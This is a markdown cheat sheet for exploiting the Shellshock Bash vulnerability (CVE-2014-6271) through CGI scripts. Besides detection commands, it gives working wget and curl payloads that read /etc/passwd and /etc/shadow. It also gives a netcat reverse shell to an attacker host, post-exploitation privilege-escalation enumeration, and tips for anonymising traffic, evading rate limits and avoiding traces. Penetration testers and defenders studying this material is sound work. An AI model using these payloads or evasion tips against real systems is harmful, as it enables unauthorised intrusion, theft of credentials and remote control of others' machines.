

### Overview

- **CVE**: CVE-2014-6271 (and related CVEs)
- **Affected Systems**: Bash versions prior to 4.3
- **Common Exploitation Vectors**: CGI scripts, web servers using Bash
- **Ports to Target**: Typically 80/443 (web services)

---

### Detection Methods

#### **1. Manual Testing (Local)**

Run the following command to test for vulnerability:

```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

- **Output includes "vulnerable"**: System is vulnerable.
- **Output shows only "test"**: System is patched.

#### **2. Automated Scanning with Nmap**

Use Nmap scripts for Shellshock detection:

```bash
# Test a specific CGI script
nmap --script http-shellshock --script-args uri=/cgi-bin/script.cgi <target-ip> -p 80

# Scan common paths for Shellshock
nmap --script http-shellshock --script-args uri=/cgi-bin/ <target-ip> -p 80
```

---

### Identifying CGI Scripts

#### **1. Scanning with Dirsearch**

```bash
# Basic scan for CGI scripts
./dirsearch.py -u http://target.com/ -e cgi -r

# Thorough scan including common extensions
./dirsearch.py -u http://target.com/ -e cgi,sh,pl,py -r -w /path/to/wordlist
```

#### **2. Common CGI Paths to Test**

- `/cgi-bin/`
- `/cgi-sys/`
- `/cgi-local/`
- `/cgi-mod/`
- `/cgi/`

---

### Exploitation Techniques

#### **1. Basic Command Execution**

```bash
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://target.com/cgi-bin/script.cgi
```

#### **2. Reverse Shell Exploitation**

**Step 1: Start a Listener**

```bash
nc -nlvp 4444
```

**Step 2: Deliver the Payload**

```bash
# Using wget
wget -U "() { foo;};echo; /bin/nc <attacker-ip> 4444 -e /bin/sh" http://target.com/cgi-bin/script.cgi

# Using curl
curl -H "User-Agent: () { :; }; echo; /bin/nc <attacker-ip> 4444 -e /bin/sh" http://target.com/cgi-bin/script.cgi
```

#### **3. Additional Payloads**

**File Reading**

```bash
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://target.com/cgi-bin/script.cgi
```

**System Enumeration**

```bash
# Get system information
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/uname -a" http://target.com/cgi-bin/script.cgi

# List running processes
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/ps -ef" http://target.com/cgi-bin/script.cgi
```

---

### Post Exploitation Steps

1. **Upgrade Shell**

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

2. **Privilege Escalation Enumeration**

```bash
id
sudo -l
find / -perm -4000 2>/dev/null   # SUID files
find / -perm -2000 2>/dev/null   # SGID files
```

---

### Operational Security Tips

- Use randomized User-Agent strings.
- Avoid automated tools in production environments.
- Space out requests to bypass rate limiting.
- Use proxies or VPNs to anonymize traffic.

---

### Common Pitfalls to Avoid

- Failing to URL-encode payloads properly.
- Testing risky commands without verifying basic functionality (e.g., `whoami`).
- Leaving traces on the target system (e.g., logs, created files).
- Writing files with improper permissions.

---

### Additional Tips and Workarounds

- If `nc` lacks the `-e` option, explore alternative reverse shell methods (Python, Perl, etc.).
- Check for WAFs or other protective mechanisms before exploiting.
- Always document your methodology and findings.

---

